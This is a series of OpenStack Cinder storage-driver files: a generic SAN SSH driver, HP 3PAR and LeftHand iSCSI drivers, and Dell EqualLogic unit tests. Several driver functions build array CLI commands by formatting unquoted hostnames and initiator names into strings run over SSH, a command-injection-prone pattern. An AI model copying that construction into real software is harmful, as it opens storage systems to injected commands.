            return self._run_ssh(command, check_exit_code)

    def _run_ssh(self, command, check_exit_code=True, attempts=1):                    
        if not self.sshpool:
            password = self.configuration.san_password
            privatekey = self.configuration.san_private_key
            min_size = self.configuration.ssh_min_pool_conn
            max_size = self.configuration.ssh_max_pool_conn
            self.sshpool = utils.SSHPool(self.configuration.san_ip,
                                         self.configuration.san_ssh_port,
                                         self.configuration.ssh_conn_timeout,
                                         self.configuration.san_login,
                                         password=password,
                                         privatekey=privatekey,
                                         min_size=min_size,
                                         max_size=max_size)
        last_exception = None
        try:
            total_attempts = attempts
            with self.sshpool.item() as ssh:
                while attempts > 0:
                    attempts -= 1
                    try:
                        return utils.ssh_execute(
                            ssh,
                            command,
                            check_exit_code=check_exit_code)
                    except Exception as e:
                        LOG.error(e)
                        last_exception = e
                        greenthread.sleep(random.randint(20, 500) / 100.0)
                try:
                    raise exception.ProcessExecutionError(
                        exit_code=last_exception.exit_code,
                        stdout=last_exception.stdout,
                        stderr=last_exception.stderr,
                        cmd=last_exception.cmd)
                except AttributeError:
                    raise exception.ProcessExecutionError(
                        exit_code=-1,
                        stdout="",
                        stderr="Error running SSH command",
                        cmd=command)

        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_("Error running SSH command: %s") % command)

    def ensure_export(self, context, volume):
        """Synchronously recreates an export for a logical volume."""
        pass

    def create_export(self, context, volume):
        """Exports the volume."""
        pass

    def remove_export(self, context, volume):
        """Removes an export for a logical volume."""
        pass

    def check_for_setup_error(self):
        """Returns an error if prerequisites aren't met."""
        if not self.run_local:
            if not (self.configuration.san_password or
                    self.configuration.san_private_key):
                raise exception.InvalidInput(
                    reason=_('Specify san_password or san_private_key'))

        # The san_ip must always be set, because we use it for the target
        if not self.configuration.san_ip:
            raise exception.InvalidInput(reason=_("san_ip must be set"))


class SanISCSIDriver(SanDriver, driver.ISCSIDriver):
    def __init__(self, *args, **kwargs):
        super(SanISCSIDriver, self).__init__(*args, **kwargs)

    def _build_iscsi_target_name(self, volume):
        return "%s%s" % (self.configuration.iscsi_target_prefix,
                         volume['name'])


# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
"""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR iSCSI Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_iscsi.HP3PARISCSIDriver
"""

import sys

from hp3parclient import exceptions as hpexceptions

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)
DEFAULT_ISCSI_PORT = 3260


class HP3PARISCSIDriver(cinder.volume.driver.ISCSIDriver):
    """OpenStack iSCSI driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware.

    """
    def __init__(self, *args, **kwargs):
        super(HP3PARISCSIDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """Sanity check to ensure we have required options set."""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password', 'san_ip', 'san_login',
                          'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'iSCSI'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()

        # map iscsi_ip-> ip_port
        #             -> iqn
        #             -> nsp
        self.iscsi_ips = {}
        temp_iscsi_ip = {}

        # use the 3PAR ip_addr list for iSCSI configuration
        if len(self.configuration.hp3par_iscsi_ips) > 0:
            # add port values to ip_addr, if necessary
            for ip_addr in self.configuration.hp3par_iscsi_ips:
                ip = ip_addr.split(':')
                if len(ip) == 1:
                    temp_iscsi_ip[ip_addr] = {'ip_port': DEFAULT_ISCSI_PORT}
                elif len(ip) == 2:
                    temp_iscsi_ip[ip[0]] = {'ip_port': ip[1]}
                else:
                    msg = _("Invalid IP address format '%s'") % ip_addr
                    LOG.warn(msg)

        # add the single value iscsi_ip_address option to the IP dictionary.
        # This way we can see if it's a valid iSCSI IP. If it's not valid,
        # we won't use it and won't bother to report it, see below
        if (self.configuration.iscsi_ip_address not in temp_iscsi_ip):
            ip = self.configuration.iscsi_ip_address
            ip_port = self.configuration.iscsi_port
            temp_iscsi_ip[ip] = {'ip_port': ip_port}

        # get all the valid iSCSI ports from 3PAR
        # when found, add the valid iSCSI ip, ip port, iqn and nsp
        # to the iSCSI IP dictionary
        # ...this will also make sure ssh works.
        iscsi_ports = self.common.get_ports()['iSCSI']
        for (ip, iscsi_info) in iscsi_ports.iteritems():
            if ip in temp_iscsi_ip:
                ip_port = temp_iscsi_ip[ip]['ip_port']
                self.iscsi_ips[ip] = {'ip_port': ip_port,
                                      'nsp': iscsi_info['nsp'],
                                      'iqn': iscsi_info['iqn']
                                      }
                del temp_iscsi_ip[ip]

        # if the single value iscsi_ip_address option is still in the
        # temp dictionary it's because it defaults to $my_ip which doesn't
        # make sense in this context. So, if present, remove it and move on.
        if (self.configuration.iscsi_ip_address in temp_iscsi_ip):
            del temp_iscsi_ip[self.configuration.iscsi_ip_address]

        # lets see if there are invalid iSCSI IPs left in the temp dict
        if len(temp_iscsi_ip) > 0:
            msg = _("Found invalid iSCSI IP address(s) in configuration "
                    "option(s) hp3par_iscsi_ips or iscsi_ip_address '%s.'") % \
                   (", ".join(temp_iscsi_ip))
            LOG.warn(msg)

        if not len(self.iscsi_ips) > 0:
            msg = _('At least one valid iSCSI IP address must be set.')
            raise exception.InvalidInput(reason=(msg))

        self.common.do_setup(context)

    def check_for_setup_error(self):
        """Returns an error if prerequisites aren't met."""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()

        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        """Clone an existing volume."""
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()

        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        Steps to export a volume on 3PAR
          * Get the 3PAR iSCSI iqn
          * Create a host on the 3par
          * create vlun on the 3par
        """
        self.common.client_login()

        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        self.common.client_logout()

        iscsi_ip = self._get_iscsi_ip(host['name'])
        iscsi_ip_port = self.iscsi_ips[iscsi_ip]['ip_port']
        iscsi_target_iqn = self.iscsi_ips[iscsi_ip]['iqn']
        info = {'driver_volume_type': 'iscsi',
                'data': {'target_portal': "%s:%s" %
                         (iscsi_ip, iscsi_ip_port),
                         'target_iqn': iscsi_target_iqn,
                         'target_lun': vlun['lun'],
                         'target_discovered': True
                         }
                }
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """Driver entry point to unattach a volume from an instance."""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['initiator'])
        self.common.client_logout()

    def _create_3par_iscsi_host(self, hostname, iscsi_iqn, domain, persona_id):
        """Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same iqn but with a different hostname, return the hostname
        used by 3PAR.
        """
        cmd = 'createhost -iscsi -persona %s -domain %s %s %s' % \                    
              (persona_id, domain, hostname, iscsi_iqn)                    
        out = self.common._cli_run(cmd, None)                    
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)
        return hostname

    def _modify_3par_iscsi_host(self, hostname, iscsi_iqn):
        # when using -add, you can not send the persona or domain options
        self.common._cli_run('createhost -iscsi -add %s %s'                    
                             % (hostname, iscsi_iqn), None)                    

    def _create_host(self, volume, connector):
        """Creates or modifies existing 3PAR host."""
        # make sure we don't have the host already
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['iSCSIPaths']:
                self._modify_3par_iscsi_host(hostname, connector['initiator'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound:
            # get persona from the volume type extra specs
            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_iscsi_host(hostname,
                                                    connector['initiator'],
                                                    domain,
                                                    persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def _get_iscsi_ip(self, hostname):
        """Get an iSCSI IP address to use.

        Steps to determine which IP address to use.
          * If only one IP address, return it
          * If there is an active vlun, return the IP associated with it
          * Return IP with fewest active vluns
        """
        if len(self.iscsi_ips) == 1:
            return self.iscsi_ips.keys()[0]

        # if we currently have an active port, use it
        nsp = self._get_active_nsp(hostname)

        if nsp is None:
            # no active vlun, find least busy port
            nsp = self._get_least_used_nsp(self._get_iscsi_nsps())
            if nsp is None:
                msg = _("Least busy iSCSI port not found, "
                        "using first iSCSI port in list.")
                LOG.warn(msg)
                return self.iscsi_ips.keys()[0]

        return self._get_ip_using_nsp(nsp)

    def _get_iscsi_nsps(self):
        """Return the list of candidate nsps."""
        nsps = []
        for value in self.iscsi_ips.values():
            nsps.append(value['nsp'])
        return nsps

    def _get_ip_using_nsp(self, nsp):
        """Return IP assiciated with given nsp."""
        for (key, value) in self.iscsi_ips.items():
            if value['nsp'] == nsp:
                return key

    def _get_active_nsp(self, hostname):
        """Return the active nsp, if one exists, for the given host."""
        result = self.common._cli_run('showvlun -a -host %s' % hostname, None)                    
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                info = line.split(",")
                if info and len(info) > 4:
                    return info[4]

    def _get_least_used_nsp(self, nspss):
        """"Return the nsp that has the fewest active vluns."""
        # return only the nsp (node:server:port)
        result = self.common._cli_run('showvlun -a -showcols Port', None)                    

        # count the number of nsps (there is 1 for each active vlun)
        nsp_counts = {}
        for nsp in nspss:
            # initialize counts to zero
            nsp_counts[nsp] = 0

        current_least_used_nsp = None
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                nsp = line.strip()
                if nsp in nsp_counts:
                    nsp_counts[nsp] = nsp_counts[nsp] + 1

            # identify key (nsp) of least used nsp
            current_smallest_count = sys.maxint
            for (nsp, count) in nsp_counts.iteritems():
                if count < current_smallest_count:
                    current_least_used_nsp = nsp
                    current_smallest_count = count

        return current_least_used_nsp

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)

#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
"""
HP Lefthand SAN ISCSI Driver.

The driver communicates to the backend aka Cliq via SSH to perform all the
operations on the SAN.
"""
from lxml import etree

from cinder import exception
from cinder.openstack.common import log as logging
from cinder.volume.drivers.san.san import SanISCSIDriver


LOG = logging.getLogger(__name__)


class HpSanISCSIDriver(SanISCSIDriver):
    """Executes commands relating to HP/Lefthand SAN ISCSI volumes.

    We use the CLIQ interface, over SSH.

    Rough overview of CLIQ commands used:

    :createVolume:    (creates the volume)

    :getVolumeInfo:    (to discover the IQN etc)

    :getClusterInfo:    (to discover the iSCSI target IP address)

    :assignVolumeChap:    (exports it with CHAP security)

    The 'trick' here is that the HP SAN enforces security by default, so
    normally a volume mount would need both to configure the SAN in the volume
    layer and do the mount on the compute layer.  Multi-layer operations are
    not catered for at the moment in the cinder architecture, so instead we
    share the volume using CHAP at volume creation time.  Then the mount need
    only use those CHAP credentials, so can take place exclusively in the
    compute layer.
    """

    device_stats = {}

    def __init__(self, *args, **kwargs):
        super(HpSanISCSIDriver, self).__init__(*args, **kwargs)
        self.cluster_vip = None

    def _cliq_run(self, verb, cliq_args, check_exit_code=True):
        """Runs a CLIQ command over SSH, without doing any result parsing"""
        cliq_arg_strings = []                    
        for k, v in cliq_args.items():
            cliq_arg_strings.append(" %s=%s" % (k, v))                    
        cmd = verb + ''.join(cliq_arg_strings)                    

        return self._run_ssh(cmd, check_exit_code)                    

    def _cliq_run_xml(self, verb, cliq_args, check_cliq_result=True):
        """Runs a CLIQ command over SSH, parsing and checking the output"""
        cliq_args['output'] = 'XML'
        (out, _err) = self._cliq_run(verb, cliq_args, check_cliq_result)

        LOG.debug(_("CLIQ command returned %s"), out)

        result_xml = etree.fromstring(out)
        if check_cliq_result:
            response_node = result_xml.find("response")
            if response_node is None:
                msg = (_("Malformed response to CLIQ command "
                         "%(verb)s %(cliq_args)s. Result=%(out)s") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

            result_code = response_node.attrib.get("result")

            if result_code != "0":
                msg = (_("Error running CLIQ command %(verb)s %(cliq_args)s. "
                         " Result=%(out)s") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

        return result_xml

    def _cliq_get_cluster_info(self, cluster_name):
        """Queries for info about the cluster (including IP)"""
        cliq_args = {}
        cliq_args['clusterName'] = cluster_name
        cliq_args['searchDepth'] = '1'
        cliq_args['verbose'] = '0'

        result_xml = self._cliq_run_xml("getClusterInfo", cliq_args)

        return result_xml

    def _cliq_get_cluster_vip(self, cluster_name):
        """Gets the IP on which a cluster shares iSCSI volumes"""
        cluster_xml = self._cliq_get_cluster_info(cluster_name)

        vips = []
        for vip in cluster_xml.findall("response/cluster/vip"):
            vips.append(vip.attrib.get('ipAddress'))

        if len(vips) == 1:
            return vips[0]

        _xml = etree.tostring(cluster_xml)
        msg = (_("Unexpected number of virtual ips for cluster "
                 " %(cluster_name)s. Result=%(_xml)s") %
               {'cluster_name': cluster_name, '_xml': _xml})
        raise exception.VolumeBackendAPIException(data=msg)

    def _cliq_get_volume_info(self, volume_name):
        """Gets the volume info, including IQN"""
        cliq_args = {}
        cliq_args['volumeName'] = volume_name
        result_xml = self._cliq_run_xml("getVolumeInfo", cliq_args)

        # Result looks like this:
        #<gauche version="1.0">
        #  <response description="Operation succeeded." name="CliqSuccess"
        #            processingTime="87" result="0">
        #    <volume autogrowPages="4" availability="online" blockSize="1024"
        #       bytesWritten="0" checkSum="false" clusterName="Cluster01"
        #       created="2011-02-08T19:56:53Z" deleting="false" description=""
        #       groupName="Group01" initialQuota="536870912" isPrimary="true"
        #       iscsiIqn="iqn.2003-10.com.lefthandnetworks:group01:25366:vol-b"
        #       maxSize="6865387257856" md5="9fa5c8b2cca54b2948a63d833097e1ca"
        #       minReplication="1" name="vol-b" parity="0" replication="2"
        #       reserveQuota="536870912" scratchQuota="4194304"
        #       serialNumber="9fa5c8b2cca54b2948a63d833097e1ca0000000000006316"
        #       size="1073741824" stridePages="32" thinProvision="true">
        #      <status description="OK" value="2"/>
        #      <permission access="rw"
        #            authGroup="api-34281B815713B78-(trimmed)51ADD4B7030853AA7"
        #            chapName="chapusername" chapRequired="true" id="25369"
        #            initiatorSecret="" iqn="" iscsiEnabled="true"
        #            loadBalance="true" targetSecret="supersecret"/>
        #    </volume>
        #  </response>
        #</gauche>

        # Flatten the nodes into a dictionary; use prefixes to avoid collisions
        volume_attributes = {}

        volume_node = result_xml.find("response/volume")
        for k, v in volume_node.attrib.items():
            volume_attributes["volume." + k] = v

        status_node = volume_node.find("status")
        if status_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes["status." + k] = v

        # We only consider the first permission node
        permission_node = volume_node.find("permission")
        if permission_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes["permission." + k] = v

        LOG.debug(_("Volume info: %(volume_name)s => %(volume_attributes)s") %
                  {'volume_name': volume_name,
                   'volume_attributes': volume_attributes})
        return volume_attributes

    def create_volume(self, volume):
        """Creates a volume."""
        cliq_args = {}
        cliq_args['clusterName'] = self.configuration.san_clustername

        if self.configuration.san_thin_provision:
            cliq_args['thinProvision'] = '1'
        else:
            cliq_args['thinProvision'] = '0'

        cliq_args['volumeName'] = volume['name']
        if int(volume['size']) == 0:
            cliq_args['size'] = '100MB'
        else:
            cliq_args['size'] = '%sGB' % volume['size']

        self._cliq_run_xml("createVolume", cliq_args)

        volume_info = self._cliq_get_volume_info(volume['name'])
        cluster_name = volume_info['volume.clusterName']
        iscsi_iqn = volume_info['volume.iscsiIqn']

        #TODO(justinsb): Is this always 1? Does it matter?
        cluster_interface = '1'

        if not self.cluster_vip:
            self.cluster_vip = self._cliq_get_cluster_vip(cluster_name)
        iscsi_portal = self.cluster_vip + ":3260," + cluster_interface

        model_update = {}

        # NOTE(jdg): LH volumes always at lun 0 ?
        model_update['provider_location'] = ("%s %s %s" %
                                             (iscsi_portal,
                                              iscsi_iqn,
                                              0))

        return model_update

    def create_volume_from_snapshot(self, volume, snapshot):
        """Creates a volume from a snapshot."""
        raise NotImplementedError()

    def create_snapshot(self, snapshot):
        """Creates a snapshot."""
        raise NotImplementedError()

    def delete_volume(self, volume):
        """Deletes a volume."""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['prompt'] = 'false'  # Don't confirm
        try:
            volume_info = self._cliq_get_volume_info(volume['name'])
        except exception.ProcessExecutionError:
            LOG.error("Volume did not exist. It will not be deleted")
            return
        self._cliq_run_xml("deleteVolume", cliq_args)

    def local_path(self, volume):
        msg = _("local_path not supported")
        raise exception.VolumeBackendAPIException(data=msg)

    def initialize_connection(self, volume, connector):
        """Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host. HP VSA requires a volume to be assigned
        to a server.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        """
        self._create_server(connector)
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml("assignVolumeToServer", cliq_args)

        iscsi_properties = self._get_iscsi_properties(volume)
        return {
            'driver_volume_type': 'iscsi',
            'data': iscsi_properties
        }

    def _create_server(self, connector):
        cliq_args = {}
        cliq_args['serverName'] = connector['host']
        out = self._cliq_run_xml("getServerInfo", cliq_args, False)
        response = out.find("response")
        result = response.attrib.get("result")
        if result != '0':
            cliq_args = {}
            cliq_args['serverName'] = connector['host']
            cliq_args['initiator'] = connector['initiator']
            self._cliq_run_xml("createServer", cliq_args)

    def terminate_connection(self, volume, connector, **kwargs):
        """Unassign the volume from the host."""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml("unassignVolumeToServer", cliq_args)

    def get_volume_stats(self, refresh):
        if refresh:
            self._update_backend_status()

        return self.device_stats

    def _update_backend_status(self):
        data = {}
        backend_name = self.configuration.safe_get('volume_backend_name')
        data['volume_backend_name'] = backend_name or self.__class__.__name__
        data['driver_version'] = '1.0'
        data['reserved_percentage'] = 0
        data['storage_protocol'] = 'iSCSI'
        data['vendor_name'] = 'Hewlett-Packard'

        result_xml = self._cliq_run_xml("getClusterInfo", {})
        cluster_node = result_xml.find("response/cluster")
        total_capacity = cluster_node.attrib.get("spaceTotal")
        free_capacity = cluster_node.attrib.get("unprovisionedSpace")
        GB = 1073741824

        data['total_capacity_gb'] = int(total_capacity) / GB
        data['free_capacity_gb'] = int(free_capacity) / GB
        self.device_stats = data

#    Copyright (c) 2013 Dell Inc.
#    Copyright 2013 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.

import time

import mox
import paramiko

from cinder import context
from cinder import exception
from cinder.openstack.common import log as logging
from cinder.openstack.common import processutils
from cinder import test
from cinder.volume import configuration as conf
from cinder.volume.drivers import eqlx


LOG = logging.getLogger(__name__)


class DellEQLSanISCSIDriverTestCase(test.TestCase):

    def setUp(self):
        super(DellEQLSanISCSIDriverTestCase, self).setUp()
        self.configuration = mox.MockObject(conf.Configuration)
        self.configuration.append_config_values(mox.IgnoreArg())
        self.configuration.san_is_local = False
        self.configuration.san_ip = "10.0.0.1"
        self.configuration.san_login = "foo"
        self.configuration.san_password = "bar"
        self.configuration.san_ssh_port = 16022
        self.configuration.san_thin_provision = True
        self.configuration.eqlx_pool = 'non-default'
        self.configuration.eqlx_use_chap = True
        self.configuration.eqlx_group_name = 'group-0'
        self.configuration.eqlx_cli_timeout = 30
        self.configuration.eqlx_cli_max_retries = 5
        self.configuration.eqlx_chap_login = 'admin'
        self.configuration.eqlx_chap_password = 'password'
        self.configuration.volume_name_template = 'volume_%s'
        self._context = context.get_admin_context()
        self.driver = eqlx.DellEQLSanISCSIDriver(
            configuration=self.configuration)
        self.volume_name = "fakevolume"
        self.volid = "fakeid"
        self.connector = {'ip': '10.0.0.2',
                          'initiator': 'iqn.1993-08.org.debian:01:222',
                          'host': 'fakehost'}
        self.fake_iqn = 'iqn.2003-10.com.equallogic:group01:25366:fakev'
        self.driver._group_ip = '10.0.1.6'
        self.properties = {
            'target_discoverd': True,
            'target_portal': '%s:3260' % self.driver._group_ip,
            'target_iqn': self.fake_iqn,
            'volume_id': 1}
        self._model_update = {
            'provider_location': "%s:3260,1 %s 0" % (self.driver._group_ip,
                                                     self.fake_iqn),
            'provider_auth': 'CHAP %s %s' % (
                self.configuration.eqlx_chap_login,
                self.configuration.eqlx_chap_password)
        }

    def _fake_get_iscsi_properties(self, volume):
        return self.properties

    def test_create_volume(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 1}
        self.driver._eql_execute('volume', 'create', volume['name'],
                                 "%sG" % (volume['size']), 'pool',
                                 self.configuration.eqlx_pool,
                                 'thin-provision').\
            AndReturn(['iSCSI target name is %s.' % self.fake_iqn])
        self.mox.ReplayAll()
        model_update = self.driver.create_volume(volume)
        self.assertEqual(model_update, self._model_update)

    def test_delete_volume(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 1}
        self.driver._eql_execute('volume', 'select', volume['name'], 'show')
        self.driver._eql_execute('volume', 'select', volume['name'], 'offline')
        self.driver._eql_execute('volume', 'delete', volume['name'])
        self.mox.ReplayAll()
        self.driver.delete_volume(volume)

    def test_delete_absent_volume(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 1, 'id': self.volid}
        self.driver._eql_execute('volume', 'select', volume['name'], 'show').\
            AndRaise(processutils.ProcessExecutionError(
                stdout='% Error ..... does not exist.\n'))
        self.mox.ReplayAll()
        self.driver.delete_volume(volume)

    def test_ensure_export(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 1}
        self.driver._eql_execute('volume', 'select', volume['name'], 'show')
        self.mox.ReplayAll()
        self.driver.ensure_export({}, volume)

    def test_create_snapshot(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        snapshot = {'name': 'fakesnap', 'volume_name': 'fakevolume_name'}
        snap_name = 'fake_snap_name'
        self.driver._eql_execute('volume', 'select', snapshot['volume_name'],
                                 'snapshot', 'create-now').\
            AndReturn(['Snapshot name is %s' % snap_name])
        self.driver._eql_execute('volume', 'select', snapshot['volume_name'],
                                 'snapshot', 'rename', snap_name,
                                 snapshot['name'])
        self.mox.ReplayAll()
        self.driver.create_snapshot(snapshot)

    def test_create_volume_from_snapshot(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        snapshot = {'name': 'fakesnap', 'volume_name': 'fakevolume_name'}
        volume = {'name': self.volume_name}
        self.driver._eql_execute('volume', 'select', snapshot['volume_name'],
                                 'snapshot', 'select', snapshot['name'],
                                 'clone', volume['name']).\
            AndReturn(['iSCSI target name is %s.' % self.fake_iqn])
        self.mox.ReplayAll()
        model_update = self.driver.create_volume_from_snapshot(volume,
                                                               snapshot)
        self.assertEqual(model_update, self._model_update)

    def test_create_cloned_volume(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        src_vref = {'id': 'fake_uuid'}
        volume = {'name': self.volume_name}
        src_volume_name = self.configuration.\
            volume_name_template % src_vref['id']
        self.driver._eql_execute('volume', 'select', src_volume_name, 'clone',
                                 volume['name']).\
            AndReturn(['iSCSI target name is %s.' % self.fake_iqn])
        self.mox.ReplayAll()
        model_update = self.driver.create_cloned_volume(volume, src_vref)
        self.assertEqual(model_update, self._model_update)

    def test_delete_snapshot(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        snapshot = {'name': 'fakesnap', 'volume_name': 'fakevolume_name'}
        self.driver._eql_execute('volume', 'select', snapshot['volume_name'],
                                 'snapshot', 'delete', snapshot['name'])
        self.mox.ReplayAll()
        self.driver.delete_snapshot(snapshot)

    def test_extend_volume(self):
        new_size = '200'
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 100}
        self.driver._eql_execute('volume', 'select', volume['name'],
                                 'size', "%sG" % new_size)
        self.mox.ReplayAll()
        self.driver.extend_volume(volume, new_size)

    def test_initialize_connection(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name}
        self.stubs.Set(self.driver, "_get_iscsi_properties",
                       self._fake_get_iscsi_properties)
        self.driver._eql_execute('volume', 'select', volume['name'], 'access',
                                 'create', 'initiator',
                                 self.connector['initiator'],
                                 'authmethod chap',                    
                                 'username',
                                 self.configuration.eqlx_chap_login)
        self.mox.ReplayAll()
        iscsi_properties = self.driver.initialize_connection(volume,
                                                             self.connector)
        self.assertEqual(iscsi_properties['data'],
                         self._fake_get_iscsi_properties(volume))

    def test_terminate_connection(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name}
        self.driver._eql_execute('volume', 'select', volume['name'], 'access',
                                 'delete', '1')
        self.mox.ReplayAll()
        self.driver.terminate_connection(volume, self.connector)

    def test_do_setup(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        fake_group_ip = '10.1.2.3'
        for feature in ('confirmation', 'paging', 'events', 'formatoutput'):
            self.driver._eql_execute('cli-settings', feature, 'off')
        self.driver._eql_execute('grpparams', 'show').\
            AndReturn(['Group-Ipaddress: %s' % fake_group_ip])
        self.mox.ReplayAll()
        self.driver.do_setup(self._context)
        self.assertEqual(fake_group_ip, self.driver._group_ip)

